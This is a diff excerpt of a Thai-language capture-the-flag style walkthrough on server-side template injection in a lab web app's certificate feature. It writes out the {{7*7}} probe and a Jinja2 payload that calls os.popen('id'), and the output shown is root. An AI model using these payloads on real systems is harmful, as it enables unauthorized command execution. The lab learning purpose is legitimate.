@@ -6,9 +6,13 @@ Step 1 สร้างบัญชี
 เขาจะให้ IP มา คือ 94.237.121.100:50594 จากนั้นเราก็เข้าไปที่ Sign In แล้วเลือก create a new account ในส่วนของข้อมูลที่ใช้สมัคร เราสามารถสมมติขึ้นมาเองได้เลย
 
 Step 2 49
+
 2.1 ไปที่ Personal Info ใส่วันเดือนปีเกิด ในส่วนนี้เราสามารถปลอมแปลงได้ 
+
 2.2 ไปที่ Full Name เปลี่ยนข้อมูลจากชื่อเป็น {{7*7}} กด Save Changes
+
 2.3 กลับไปที่ Dashboard กด Download Certificate
+
 2.4 สังเกตตรง Name มันจะเป็น 49 ถ้าไม่ใช่ 49 ให้กลับไปดูตรง Full Name ในหน้า Personal Info ใหม่
 
 Step 3 id
@@ -26,9 +30,11 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
 3.2 กลับไปที่ Dashboard กด Download Certificate
+
 3.3 สังเกตตรง Name มันจะเปลี่ยนเป็น uid=0(root) gid=0(root) groups=0(root)
 
 Step 4 ls
+
 4.1 ไปที่ Personal Info และไปที่ Full Name เปลี่ยนข้อมูลจาก
 ```
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }} 
